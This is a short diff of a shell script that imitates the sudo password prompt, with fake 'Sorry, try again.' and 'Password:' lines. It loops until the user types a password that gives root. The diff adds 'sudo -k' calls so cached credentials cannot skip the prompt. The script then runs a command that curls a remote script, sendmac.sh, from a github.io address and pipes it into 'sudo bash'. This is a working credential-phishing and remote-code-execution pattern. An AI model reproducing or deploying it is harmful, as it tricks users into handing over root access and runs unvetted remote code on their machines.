@@ -3,14 +3,16 @@
 echo ""
 
 pwd=""
+sudo -k
 
-while [ "$(echo $pwd | sudo -Sk whoami)" != "root" ]
+while [ "$(echo $pwd | sudo -S whoami)" != "root" ]
 do
   sleep 3000
   echo "Sorry, try again."
   echo -n "Password:"
   read -s pwd </dev/tty
   echo ""
+  sudo -k
 done
 
 command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sudo bash"
